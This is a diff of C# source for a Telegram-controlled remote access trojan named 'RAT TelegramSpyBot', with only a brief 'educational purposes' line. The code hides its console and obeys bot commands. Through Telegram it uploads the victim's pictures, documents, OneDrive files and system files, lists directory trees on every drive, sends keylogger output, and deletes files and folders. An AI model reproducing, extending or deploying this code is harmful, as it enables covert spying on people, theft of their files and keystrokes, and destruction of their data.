@@ -1,4 +1,4 @@
-﻿using RAT_BotTelegram.Lib;
+﻿using RATTelegramSpyBot.Lib;
 using System;
 using System.IO;
 using System.Linq;
@@ -10,8 +10,9 @@ using Telegram.Bot.Requests;
 using Telegram.Bot.Types.Enums;
 using Telegram.Bot.Types.ReplyMarkups;
 
-namespace RAT_BotTelegram {
+namespace RATTelegramSpyBot {
     class MainRAT {
+        #region Funcion main
         private static readonly TelegramBotClient Bot = new TelegramBotClient(config.TOKEN);
         public static string Path { get; set; }
         // Ocultar Consola
@@ -32,7 +33,6 @@ namespace RAT_BotTelegram {
             // Delay
             Thread.Sleep(config.DELAY * 1000);
             #endregion
-
             #region Main
             //Método que se ejecuta cuando se recibe un mensaje
             Bot.OnMessage += BotOnMessageReceived;
@@ -53,44 +53,18 @@ namespace RAT_BotTelegram {
             Bot.StopReceiving();
             #endregion
         }
-        private static async void GetDirectoryAll(string path, int indent = 0) {
-            try {
-                try {
-                    if ((File.GetAttributes(path) & FileAttributes.ReparsePoint) != FileAttributes.ReparsePoint) {
-                        foreach (string folder in Directory.GetDirectories(path)) {
-                            //Console.WriteLine( "{0}{1}", new string(' ', indent), Path.GetFileName(folder));
 
-                            await Bot.SendTextMessageAsync(config.ID, folder);
+        #endregion 
 
-                            GetDirectoryAll(folder, indent + 2);
-                        }
-                    }
-                } catch (UnauthorizedAccessException) { }
-
-            } catch {   // Si no encuentra el directorio
-                await Bot.SendTextMessageAsync(config.ID, "No se encontró ese directorio en ésta computadora");
-            }
-        }
-        private static async void ListarFiles(string Path) {
-            if (Path == "") {
-                SendBotMessage("Usted no ingresó una ruta en el comando.\nEjemplo de comando:\n /Dir O:\\OneDrive - xKx\\Photos and Videos of my Life\\2019\\Family  ");
-            } else {
-                foreach (var file in Tools.GetFile(Path)) {
-                    string FData = infoFile(file);
-                    await Bot.SendTextMessageAsync(config.ID, "" + FData, ParseMode.Html);
-                }
-            }
-            
-        }
+        // Zona Importante 
         private static async void BotOnMessageReceived(object sender, MessageEventArgs messageEventArgs) {
-            
+
             var message = messageEventArgs.Message;
             if (message == null || message.Type != MessageType.Text) return;
             string Command = message.Text.Split(' ').First();           // Case "Comando"
             Path = message.Text.Substring(Command.Length);       // Obtiene el subcomando
 
             switch (message.Text.Split(' ').First()) {
-                #region CommandsFinish 
                 case "/Status": // Verifica Si la PC se encuentra en linea
                     await Bot.SendTextMessageAsync(config.ID, "==>>    Computer: " + Features.getUserName() + " is online    <<== ");
                     break;
@@ -98,6 +72,7 @@ namespace RAT_BotTelegram {
                     await Bot.SendTextMessageAsync(config.ID, Tools.PC_Info());
                     break;
                 case "/Get_FilesAll":  // Menú Obtiene archivos
+                    #region /Get_FilesAll
                     var GetFiles = new InlineKeyboardMarkup(new[]{
                     new[]{
                         InlineKeyboardButton.WithCallbackData(text: "|USER| Get Pictures"        ,callbackData: "GetPictures"),
@@ -136,7 +111,8 @@ namespace RAT_BotTelegram {
                     await Bot.SendTextMessageAsync(config.ID, "User Files: " + Features.getUserName(), replyMarkup: GetFiles);        // Obtiene USER
                     await Bot.SendTextMessageAsync(config.ID, "OneDrive Files: |English| ", replyMarkup: GetFilesOneDrive); // Obtiene USER Onedrive
                     await Bot.SendTextMessageAsync(config.ID, "OneDrive Files: |Español|", replyMarkup: GetFilesOneDriveE); // Obtiene USER Onedrive
-                    break;            
+                    break;
+                #endregion
                 case "/Dir":
 
                     if (Path.Length <= 4) {
@@ -152,39 +128,39 @@ namespace RAT_BotTelegram {
                         InlineKeyboardButton.WithCallbackData(text: "Directory Tree C:\\"       ,callbackData: "DDC"),
                         InlineKeyboardButton.WithCallbackData(text: "Directory Tree D:\\"       ,callbackData: "DDD"),
                         InlineKeyboardButton.WithCallbackData(text: "Directory Tree E:\\"       ,callbackData: "DDE"),
-                    },new[]{                                                                    
+                    },new[]{
                         InlineKeyboardButton.WithCallbackData(text: "Directory Tree F:\\"       ,callbackData: "DDF"),
                         InlineKeyboardButton.WithCallbackData(text: "Directory Tree G:\\"       ,callbackData: "DDG"),
                         InlineKeyboardButton.WithCallbackData(text: "Directory Tree H:\\"       ,callbackData: "DDH"),
-                    },new[]{                                                                     
+                    },new[]{
                         InlineKeyboardButton.WithCallbackData(text: "Directory Tree I:\\"       ,callbackData: "DDI"),
                         InlineKeyboardButton.WithCallbackData(text: "Directory Tree J:\\"       ,callbackData: "DDJ"),
                         InlineKeyboardButton.WithCallbackData(text: "Directory Tree K:\\"       ,callbackData: "DDK"),
-                    },new[]{                                                                   
+                    },new[]{
                         InlineKeyboardButton.WithCallbackData(text: "Directory Tree L:\\"       ,callbackData: "DDL"),
                         InlineKeyboardButton.WithCallbackData(text: "Directory Tree M:\\"       ,callbackData: "DDM"),
                         InlineKeyboardButton.WithCallbackData(text: "Directory Tree N:\\"       ,callbackData: "DDN"),
-                    },new[]{                                                                      
+                    },new[]{
                         InlineKeyboardButton.WithCallbackData(text: "Directory Tree O:\\"       ,callbackData: "DDO"),
                         InlineKeyboardButton.WithCallbackData(text: "Directory Tree P:\\"       ,callbackData: "DDP"),
                         InlineKeyboardButton.WithCallbackData(text: "Directory Tree Q:\\"       ,callbackData: "DDQ"),
-                    },new[]{                                                                   
+                    },new[]{
                         InlineKeyboardButton.WithCallbackData(text: "Directory Tree R:\\"       ,callbackData: "DDR"),
                         InlineKeyboardButton.WithCallbackData(text: "Directory Tree S:\\"       ,callbackData: "DDS"),
                         InlineKeyboardButton.WithCallbackData(text: "Directory Tree T:\\"       ,callbackData: "DDT"),
-                    },new[]{                                                                    
+                    },new[]{
                         InlineKeyboardButton.WithCallbackData(text: "Directory Tree U:\\"       ,callbackData: "DDU"),
                         InlineKeyboardButton.WithCallbackData(text: "Directory Tree V:\\"       ,callbackData: "DDV"),
                         InlineKeyboardButton.WithCallbackData(text: "Directory Tree W:\\"       ,callbackData: "DDW"),
-                    },new[]{                                                                   
+                    },new[]{
                         InlineKeyboardButton.WithCallbackData(text: "Directory Tree X:\\"       ,callbackData: "DDX"),
                         InlineKeyboardButton.WithCallbackData(text: "Directory Tree Z:\\"       ,callbackData: "DDZ"),
-                        
+
                     }});
                     await Bot.SendTextMessageAsync(config.ID, "<b>NOTA: Este proceso puede demorar varios minutos, al culminár habrá un mensaje de FINISH'</b>", ParseMode.Html);
                     await Bot.SendTextMessageAsync(config.ID, "<b>NOTA2 : Se Omitirán directorios Protegidos con permisos especiales o del sistema</b>", ParseMode.Html);
                     await Bot.SendTextMessageAsync(config.ID, "Show directory tree from disk", replyMarkup: Disk);        // Obtiene USER
-                    
+
 
                     break;
                 case "/Get_OnlyFile":
@@ -203,16 +179,15 @@ namespace RAT_BotTelegram {
                     }
                     Path = "";
                     break;
-                #endregion
-
+  
                 case "/Keylogger":
                     GetOnlyFileTelegram(config.PATH_KEY);
                     break;
-                
+
                 case "/Delete_Folder":
                     if (Path.Length <= 4) {
                         SendBotMessage("Ejemplo de comando\n /Get_OnlyFile C:\\User\\Photos and videos\\foto34.jpg\n/Get_OnlyFile D:\\Documentos\\Monografía.docx");
-                        
+
                     } else {
                         Delete(Path, true);
                     }
@@ -230,6 +205,7 @@ namespace RAT_BotTelegram {
                     break;
 
                 case "/About":
+                    #region /About
                     string about =
                         "<b>Developed by:</b> <code>SebastianEPH</code>" +
                         "\n<b>Product Name: </b>" + @"<a href=""https://github.com/SebastianEPH/RAT.TelegramSpyBot"">RAT TelegramSpyBot</a>" + " C#" +
@@ -253,13 +229,14 @@ namespace RAT_BotTelegram {
                         "\n<b> - " + @"<a href=""https://sebastianeph.github.io/"">WebSite</a>" + " </b>" +
                         "\n<b> - SebastianEPH99@gmail.com</b>" +
                         "\n<b></b>" +
-                        "\n<b>You can read the documentation at the following link >></b>" + 
+                        "\n<b>You can read the documentation at the following link >></b>" +
                         "\n<b></b>";
 
                     await Bot.SendTextMessageAsync(config.ID, about, ParseMode.Html);
                     await Bot.SendPhotoAsync(chatId: config.ID, photo: "https://i.imgur.com/SelWET0.png");
                     await Bot.SendTextMessageAsync(config.ID, "\n\n<b>[Fines educativos]</b>", ParseMode.Html);
                     break;
+                #endregion
 
                 //Mensaje por default
                 default:
@@ -278,250 +255,10 @@ namespace RAT_BotTelegram {
                   "\n\r" +
                   "\n/About         <This Information>" +
                   "";
-                    await Bot.SendTextMessageAsync(config.ID, "<b> * Use the following commands:</b> *\n" , ParseMode.Html );
+                    await Bot.SendTextMessageAsync(config.ID, "<b> * Use the following commands:</b> *\n", ParseMode.Html);
                     await Bot.SendTextMessageAsync(config.ID, usage, replyMarkup: new ReplyKeyboardRemove());
                     break;
             }
-        }
-        private static string infoFile(string file) {  // Muestra información detallada del archivo
-            try {
-                FileInfo fil = new FileInfo(file);
-                string FData =
-                    "\n<b>Name =</b> " + fil.Name +
-                    "\n<b>Extension =</b> " + fil.Extension +
-                    "\n<b>Zise   =</b> " + fil.Length + " <b>bytes</b>" +
-                    "\n<b>Creation Data =</b> " + fil.CreationTime +
-                    "\n<b>Is Read Only =</b> " + fil.IsReadOnly +
-                    "\n<b>Last Access Time =</b> " + fil.LastAccessTime +
-                    "\n<b>Last Write Time =</b> " + fil.LastWriteTime +
-                    "\n<b>Directory =</b> " + fil.DirectoryName +
-                    "\n<b>Full Directory =</b> " + file;
-                return FData;
-            } catch  {
-                return "Hubo un problema com la ruta";
-            }
-            
-        }
-        private static bool infoFileZize(string file) {  // Verifica si el archivo no supera los 50MB
-            FileInfo fil = new FileInfo(file);
-            var zise = fil.Length;
-            // Convierte var en int 
-            int MB = int.Parse(zise.ToString());
-            // Ejemplo : 44.6MB = 46792411
-            // Ejemplo : 95.3KB = 497687
-            if (MB >= 49999999) {
-                return false;   // Supera los 50MB
-            } else {
-                return true;    // No supera los 50Mb
-            }
-        }
-        private static bool infoFileZizePhoto(string file) {  // Verifica si el archivo no supera los 50MB
-            FileInfo fil = new FileInfo(file);
-            var zise = fil.Length;
-            // Convierte var en int 
-            int MB = int.Parse(zise.ToString());
-            // Ejemplo : 44.6MB = 46792411
-            // Ejemplo : 95.3KB = 497687
-            if (MB >= 9999999) {
-                return false;   // Supera los 50MB
-            } else {
-                return true;    // No supera los 10Mb
-            }
-        }
-        private static void Delete(string Path, bool folder = false) {
-            if (Path != "" || Path != "[-]") {
-                try {
-                    if (!folder) {
-                        File.Delete(Path);
-                        SendBotMessage($"Se eliminó el archivo: {Path} \nCorrectamente");
-                    } else {
-                        Directory.Delete(Path, true);
-                        SendBotMessage($"Se eliminó la Carpeta: {Path} \nCorrectamente");
-                    }   
-                } catch {
-                    SendBotMessage($"No se puedo eliminar: {Path} ");
-                }
-            } else {
-                SendBotMessage("La Ruta ingresada está Vacía");
-                Console.WriteLine("La ruta ingresada está vacía");
-            }
-           
-
-            
-        }
-        private async static void GetOnlyFileTelegram(string file) {
-            if (file != "") {
-                try {
-                    if (infoFileZize(file)) {
-                        switch (GetFileType(file)) {
-                            case "[Imagen]":
-                                if (infoFileZizePhoto(file)) {
-                                    try {
-                                        await Bot.SendPhotoAsync(config.ID, File.Open(file, FileMode.Open), GetFileName(file));
-                                    } catch {
-                                        // Enviar como documento.
-                                        await Bot.SendTextMessageAsync(config.ID, "Hubo un Error al subir la imagen, " + GetFileName(file));
-                                    }
-                                } else {
-                                    try {
-                                        await Bot.SendDocumentAsync(config.ID, File.Open(file, FileMode.Open), GetFileName(file));
-                                    } catch {
-                                        // Enviar como documento.
-                                        await Bot.SendTextMessageAsync(config.ID, "Hubo un Error al subir la imagen, " + GetFileName(file));
-                                    }
-                                }
-                                break;
-                            case "[Video]":
-                                try {
-                                    await Bot.SendVideoAsync(config.ID, File.Open(file, FileMode.Open));
-                                } catch {
-                                    await Bot.SendTextMessageAsync(config.ID, "Hubo un Error al subir el video, " + GetFileName(file));
-
-                                }
-                                break;
-                            case "[Audio]":
-                                try {
-                                    await Bot.SendAudioAsync(config.ID, File.Open(file, FileMode.Open), GetFileName(file));
-                                } catch (Exception) {
-                                    await Bot.SendTextMessageAsync(config.ID, "Hubo un Error al subir el audio, " + GetFileName(file));
-                                }
-                                break;
-                            case "[Doc]":
-                                try {
-                                    await Bot.SendDocumentAsync(config.ID, File.Open(file, FileMode.Open), GetFileName(file));
-                                } catch (Exception) {
-                                    await Bot.SendTextMessageAsync(config.ID, "Hubo un Error al subir el archivo, " + GetFileName(file));
-                                }
-                                break;
-                            case "[System]": // El archivo se omitidos
-                                try {
-                                    await Bot.SendDocumentAsync(config.ID, File.Open(file, FileMode.Open), GetFileName(file));
-                                } catch (Exception) {
-                                    await Bot.SendTextMessageAsync(config.ID, "Hubo un Error al subir el archivo, " + GetFileName(file));
-                                }
-                                break;
-                            default:
-                                await Bot.SendTextMessageAsync(config.ID, "Se ignoró el archivo " + GetFileName(file));
-                                break;
-                        }
-                    } else {
-                        await Bot.SendTextMessageAsync(config.ID, "El Archivo supera los 50MB, Por restriciones del API de telegram, éste archivo no se puede envíar" + GetFileName(file));
-                    }
-
-                } catch {
-                    SendBotMessage("No se encontró el archivo");
-                }
-            } else {
-                SendBotMessage("La Ruta ingresada está vacía");
-            }
-            
-            
-        }
-        private static async void GetFilesTelegram(string Path) { // Sube los archivos obtenidos a telegram
-            await Bot.SendTextMessageAsync(config.ID, "******************** Start ********************** ");
-            if (Tools.GetFile(Path).GetValue(0).ToString() == "[-]") {
-                await Bot.SendTextMessageAsync(config.ID, "La carpeta no existe!!, \n\nIntente con otra dirección.");
-            } else {
-                foreach (var file in Tools.GetFile(Path)) {
-                    GetOnlyFileTelegram(file);
-                }
-            }
-
-            await Bot.SendTextMessageAsync(config.ID, "******************** Finish ********************* ");
-        }
-        private static async void SendBotMessage(string text = "") {
-            await Bot.SendTextMessageAsync(config.ID, text);
-        }
-        private static string GetFileName(string dir) {   // Retorna solo el nombre del archivo
-
-            if (dir == "[-]") { // Verifica si no hay algún error
-                return "[-]";
-            }
-            //string path = @"D:\PNG Icons\System Win 10\camera.png";
-            try {
-                /* Utiliza la variable para obtener el ultimo contendor 
-                 * =Ejemplo:
-                 * [Antes]    path = "C:\User\UserName\Photos\SoyUnaImagen.png" 
-                 * [Despues]  path =  "SoyUnaImagen.png"                                                         */
-                int palabraClave = dir.LastIndexOf(@"\");
-                dir = dir.Substring(palabraClave + 1);
-                return dir;
-            } catch {
-                return "[-]"; // Hubo un problema 
-            }
-
-        }
-        private static string GetFileType(string File) {
-            /* Utiliza la variable para obtener el ultimo contendor 
-             * =Ejemplo:
-             * [Antes]    path = "SoyUnaImagen.png" 
-             * [Despues]  path =  "[Imagen]"             */
-            if (File == "[-]") {
-                return "[-]";
-            }
-
-            string dir = GetFileName(File);
-            //string dir2 = dir;       // Solo antibuggeo
-            try {
-                int palabraClave = dir.LastIndexOf(".");
-                dir = dir.Substring(palabraClave + 1);
-            } catch {
-                return "[-]";
-            }
-
-            // Convierte la extensión en minuscula.
-            dir = dir.ToLower();
-            String[] video = { "gif", "mp4", "avi", "div", "m4v", "mov", "mpg", "mpeg", "qt", "wmv", "webm", "flv", "3gp" };
-            String[] audio = { "midi", "mp1", "mp2", "mp3", "wma", "ogg", "au", "m4a", "flac" };
-            String[] doc = { "doc", "docx", "txt", "log", "ppt", "pptx", "pdf", "xlxs", "xlx", "psd", "csv" };
-            String[] imagen = { "jpg", "jpeg", "png", "bmp", "ico", "jpe", "jpe" };
-            String[] system = { "ani", "bat", "bfc", "bkf", "blg", "cat", "cer", "cfg", "chm", "chk", "clp", "cmd", "cnf", "com", "cpl", "crl", "crt", "cur", "dat", "db",
-                                "der", "dll", "drv", "ds", "dsn" , "dun","exe","fnd","fng","fon","grp","hlp","ht","inf","ini","ins","isp","job","key","lnk","msi","msp","msstyles",
-                                "nfo","ocx","otf","p7c","pfm","pif","pko","pma","pmc","pml","pmr","pmw","pnf","psw","qds","rdp","reg","scf","scr","sct","shb","shs","sys","theme",
-                                "tmp","ttc","ttf","udl","vxd","wab","wmdb","wme","wsc","wsf","wsh","zap"};
-
-            // Verifica si el archivo es una imagen
-            foreach (string ext in imagen) {
-                if (ext == dir) {
-                    Console.WriteLine("\n" + dir + " <= es una Imagen");  // Solo debug
-                    return "[Imagen]";
-                }
-                Console.WriteLine(dir + " <= No es [Imagen] ");  // Solo debug
-            }
-            // Verifica si el archivo es una video 
-            foreach (string ext in video) {
-                if (ext == dir) {
-                    Console.WriteLine("\n" + dir + " <= es un Video");  // Solo debug
-                    return "[Video]";
-                }
-                Console.WriteLine(dir + " <= No es [Video] ");  // Solo debug
-            }
-            // Verifica si el archivo es un Adudio
-            foreach (string ext in audio) {
-                if (ext == dir) {
-                    Console.WriteLine("\n" + dir + " <= es un Audio");  // Solo debug
-                    return "[Audio]";
-                }
-                Console.WriteLine(dir + " <= No es [Audio] ");  // Solo debug
-            }
-            // Verifica si el archivo es un Documento
-            foreach (string ext in doc) {
-                if (ext == dir) {
-                    Console.WriteLine("\n" + dir + " <= es un Documento");  // Solo debug
-                    return "[Doc]";
-                }
-                Console.WriteLine(dir + " <= No es [Doc] ");  // Solo debug
-            }
-            // Verifica si el archivo es un Documento
-            foreach (string ext in system) {
-                if (ext == dir) {
-                    Console.WriteLine("\n" + dir + " <= es un System");  // Solo debug
-                    return "[System]";
-                }
-                Console.WriteLine(dir + " <= No es [System] ");  // Solo debug
-            }
-
-            return "[-]"; // Extension File
         }
         private static async void BotOnCallbackQueryReceived(object sender, CallbackQueryEventArgs callbackQueryEventArgs) {
 
@@ -714,5 +451,279 @@ namespace RAT_BotTelegram {
                 receiveErrorEventArgs.ApiRequestException.ErrorCode,
                 receiveErrorEventArgs.ApiRequestException.Message);
         }
+
+        #region Funciones Complementarias [importantes] 
+        private static async void GetDirectoryAll(string path, int indent = 0) {
+            try {
+                try {
+                    if ((File.GetAttributes(path) & FileAttributes.ReparsePoint) != FileAttributes.ReparsePoint) {
+                        foreach (string folder in Directory.GetDirectories(path)) {
+                            //Console.WriteLine( "{0}{1}", new string(' ', indent), Path.GetFileName(folder));
+
+                            await Bot.SendTextMessageAsync(config.ID, folder);
+
+                            GetDirectoryAll(folder, indent + 2);
+                        }
+                    }
+                } catch (UnauthorizedAccessException) { }
+
+            } catch {   // Si no encuentra el directorio
+                await Bot.SendTextMessageAsync(config.ID, "No se encontró ese directorio en ésta computadora");
+            }
+        }
+        private static async void ListarFiles(string Path) {
+            if (Path == "") {
+                SendBotMessage("Usted no ingresó una ruta en el comando.\nEjemplo de comando:\n /Dir O:\\OneDrive - xKx\\Photos and Videos of my Life\\2019\\Family  ");
+            } else {
+                foreach (var file in Tools.GetFile(Path)) {
+                    string FData = infoFile(file);
+                    await Bot.SendTextMessageAsync(config.ID, "" + FData, ParseMode.Html);
+                }
+            }
+
+        }
+        private static string infoFile(string file) {  // Muestra información detallada del archivo
+            try {
+                FileInfo fil = new FileInfo(file);
+                string FData =
+                    "\n<b>Name =</b> " + fil.Name +
+                    "\n<b>Extension =</b> " + fil.Extension +
+                    "\n<b>Zise   =</b> " + fil.Length + " <b>bytes</b>" +
+                    "\n<b>Creation Data =</b> " + fil.CreationTime +
+                    "\n<b>Is Read Only =</b> " + fil.IsReadOnly +
+                    "\n<b>Last Access Time =</b> " + fil.LastAccessTime +
+                    "\n<b>Last Write Time =</b> " + fil.LastWriteTime +
+                    "\n<b>Directory =</b> " + fil.DirectoryName +
+                    "\n<b>Full Directory =</b> " + file;
+                return FData;
+            } catch {
+                return "Hubo un problema com la ruta";
+            }
+
+        }
+        private static bool infoFileZize(string file) {  // Verifica si el archivo no supera los 50MB
+            FileInfo fil = new FileInfo(file);
+            var zise = fil.Length;
+            // Convierte var en int 
+            int MB = int.Parse(zise.ToString());
+            // Ejemplo : 44.6MB = 46792411
+            // Ejemplo : 95.3KB = 497687
+            if (MB >= 49999999) {
+                return false;   // Supera los 50MB
+            } else {
+                return true;    // No supera los 50Mb
+            }
+        }
+        private static bool infoFileZizePhoto(string file) {  // Verifica si el archivo no supera los 50MB
+            FileInfo fil = new FileInfo(file);
+            var zise = fil.Length;
+            // Convierte var en int 
+            int MB = int.Parse(zise.ToString());
+            // Ejemplo : 44.6MB = 46792411
+            // Ejemplo : 95.3KB = 497687
+            if (MB >= 9999999) {
+                return false;   // Supera los 50MB
+            } else {
+                return true;    // No supera los 10Mb
+            }
+        }
+        private static void Delete(string Path, bool folder = false) {
+            if (Path != "" || Path != "[-]") {
+                try {
+                    if (!folder) {
+                        File.Delete(Path);
+                        SendBotMessage($"Se eliminó el archivo: {Path} \nCorrectamente");
+                    } else {
+                        Directory.Delete(Path, true);
+                        SendBotMessage($"Se eliminó la Carpeta: {Path} \nCorrectamente");
+                    }
+                } catch {
+                    SendBotMessage($"No se puedo eliminar: {Path} ");
+                }
+            } else {
+                SendBotMessage("La Ruta ingresada está Vacía");
+                Console.WriteLine("La ruta ingresada está vacía");
+            }
+
+
+
+        }
+        private async static void GetOnlyFileTelegram(string file) {
+            if (file != "") {
+                try {
+                    if (infoFileZize(file)) {
+                        switch (GetFileType(file)) {
+                            case "[Imagen]":
+                                if (infoFileZizePhoto(file)) {
+                                    try {
+                                        await Bot.SendPhotoAsync(config.ID, File.Open(file, FileMode.Open), GetFileName(file));
+                                    } catch {
+                                        // Enviar como documento.
+                                        await Bot.SendTextMessageAsync(config.ID, "Hubo un Error al subir la imagen, " + GetFileName(file));
+                                    }
+                                } else {
+                                    try {
+                                        await Bot.SendDocumentAsync(config.ID, File.Open(file, FileMode.Open), GetFileName(file));
+                                    } catch {
+                                        // Enviar como documento.
+                                        await Bot.SendTextMessageAsync(config.ID, "Hubo un Error al subir la imagen, " + GetFileName(file));
+                                    }
+                                }
+                                break;
+                            case "[Video]":
+                                try {
+                                    await Bot.SendVideoAsync(config.ID, File.Open(file, FileMode.Open));
+                                } catch {
+                                    await Bot.SendTextMessageAsync(config.ID, "Hubo un Error al subir el video, " + GetFileName(file));
+
+                                }
+                                break;
+                            case "[Audio]":
+                                try {
+                                    await Bot.SendAudioAsync(config.ID, File.Open(file, FileMode.Open), GetFileName(file));
+                                } catch (Exception) {
+                                    await Bot.SendTextMessageAsync(config.ID, "Hubo un Error al subir el audio, " + GetFileName(file));
+                                }
+                                break;
+                            case "[Doc]":
+                                try {
+                                    await Bot.SendDocumentAsync(config.ID, File.Open(file, FileMode.Open), GetFileName(file));
+                                } catch (Exception) {
+                                    await Bot.SendTextMessageAsync(config.ID, "Hubo un Error al subir el archivo, " + GetFileName(file));
+                                }
+                                break;
+                            case "[System]": // El archivo se omitidos
+                                try {
+                                    await Bot.SendDocumentAsync(config.ID, File.Open(file, FileMode.Open), GetFileName(file));
+                                } catch (Exception) {
+                                    await Bot.SendTextMessageAsync(config.ID, "Hubo un Error al subir el archivo, " + GetFileName(file));
+                                }
+                                break;
+                            default:
+                                await Bot.SendTextMessageAsync(config.ID, "Se ignoró el archivo " + GetFileName(file));
+                                break;
+                        }
+                    } else {
+                        await Bot.SendTextMessageAsync(config.ID, "El Archivo supera los 50MB, Por restriciones del API de telegram, éste archivo no se puede envíar" + GetFileName(file));
+                    }
+
+                } catch {
+                    SendBotMessage("No se encontró el archivo");
+                }
+            } else {
+                SendBotMessage("La Ruta ingresada está vacía");
+            }
+
+
+        }
+        private static async void GetFilesTelegram(string Path) { // Sube los archivos obtenidos a telegram
+            await Bot.SendTextMessageAsync(config.ID, "******************** Start ********************** ");
+            if (Tools.GetFile(Path).GetValue(0).ToString() == "[-]") {
+                await Bot.SendTextMessageAsync(config.ID, "La carpeta no existe!!, \n\nIntente con otra dirección.");
+            } else {
+                foreach (var file in Tools.GetFile(Path)) {
+                    GetOnlyFileTelegram(file);
+                }
+            }
+
+            await Bot.SendTextMessageAsync(config.ID, "******************** Finish ********************* ");
+        }
+        private static async void SendBotMessage(string text = "") {
+            await Bot.SendTextMessageAsync(config.ID, text);
+        }
+        private static string GetFileName(string dir) {   // Retorna solo el nombre del archivo
+
+            if (dir == "[-]") { // Verifica si no hay algún error
+                return "[-]";
+            }
+            //string path = @"D:\PNG Icons\System Win 10\camera.png";
+            try {
+                /* Utiliza la variable para obtener el ultimo contendor 
+                 * =Ejemplo:
+                 * [Antes]    path = "C:\User\UserName\Photos\SoyUnaImagen.png" 
+                 * [Despues]  path =  "SoyUnaImagen.png"                                                         */
+                int palabraClave = dir.LastIndexOf(@"\");
+                dir = dir.Substring(palabraClave + 1);
+                return dir;
+            } catch {
+                return "[-]"; // Hubo un problema 
+            }
+
+        }
+        private static string GetFileType(string File) {
+            /* Utiliza la variable para obtener el ultimo contendor 
+             * =Ejemplo:
+             * [Antes]    path = "SoyUnaImagen.png" 
+             * [Despues]  path =  "[Imagen]"             */
+            if (File == "[-]") {
+                return "[-]";
+            }
+
+            string dir = GetFileName(File);
+            //string dir2 = dir;       // Solo antibuggeo
+            try {
+                int palabraClave = dir.LastIndexOf(".");
+                dir = dir.Substring(palabraClave + 1);
+            } catch {
+                return "[-]";
+            }
+
+            // Convierte la extensión en minuscula.
+            dir = dir.ToLower();
+            String[] video = { "gif", "mp4", "avi", "div", "m4v", "mov", "mpg", "mpeg", "qt", "wmv", "webm", "flv", "3gp" };
+            String[] audio = { "midi", "mp1", "mp2", "mp3", "wma", "ogg", "au", "m4a", "flac" };
+            String[] doc = { "doc", "docx", "txt", "log", "ppt", "pptx", "pdf", "xlxs", "xlx", "psd", "csv" };
+            String[] imagen = { "jpg", "jpeg", "png", "bmp", "ico", "jpe", "jpe" };
+            String[] system = { "ani", "bat", "bfc", "bkf", "blg", "cat", "cer", "cfg", "chm", "chk", "clp", "cmd", "cnf", "com", "cpl", "crl", "crt", "cur", "dat", "db",
+                                "der", "dll", "drv", "ds", "dsn" , "dun","exe","fnd","fng","fon","grp","hlp","ht","inf","ini","ins","isp","job","key","lnk","msi","msp","msstyles",
+                                "nfo","ocx","otf","p7c","pfm","pif","pko","pma","pmc","pml","pmr","pmw","pnf","psw","qds","rdp","reg","scf","scr","sct","shb","shs","sys","theme",
+                                "tmp","ttc","ttf","udl","vxd","wab","wmdb","wme","wsc","wsf","wsh","zap"};
+
+            // Verifica si el archivo es una imagen
+            foreach (string ext in imagen) {
+                if (ext == dir) {
+                    Console.WriteLine("\n" + dir + " <= es una Imagen");  // Solo debug
+                    return "[Imagen]";
+                }
+                Console.WriteLine(dir + " <= No es [Imagen] ");  // Solo debug
+            }
+            // Verifica si el archivo es una video 
+            foreach (string ext in video) {
+                if (ext == dir) {
+                    Console.WriteLine("\n" + dir + " <= es un Video");  // Solo debug
+                    return "[Video]";
+                }
+                Console.WriteLine(dir + " <= No es [Video] ");  // Solo debug
+            }
+            // Verifica si el archivo es un Adudio
+            foreach (string ext in audio) {
+                if (ext == dir) {
+                    Console.WriteLine("\n" + dir + " <= es un Audio");  // Solo debug
+                    return "[Audio]";
+                }
+                Console.WriteLine(dir + " <= No es [Audio] ");  // Solo debug
+            }
+            // Verifica si el archivo es un Documento
+            foreach (string ext in doc) {
+                if (ext == dir) {
+                    Console.WriteLine("\n" + dir + " <= es un Documento");  // Solo debug
+                    return "[Doc]";
+                }
+                Console.WriteLine(dir + " <= No es [Doc] ");  // Solo debug
+            }
+            // Verifica si el archivo es un Documento
+            foreach (string ext in system) {
+                if (ext == dir) {
+                    Console.WriteLine("\n" + dir + " <= es un System");  // Solo debug
+                    return "[System]";
+                }
+                Console.WriteLine(dir + " <= No es [System] ");  // Solo debug
+            }
+
+            return "[-]"; // Extension File
+        }
+
+        #endregion 
+
     }
 }
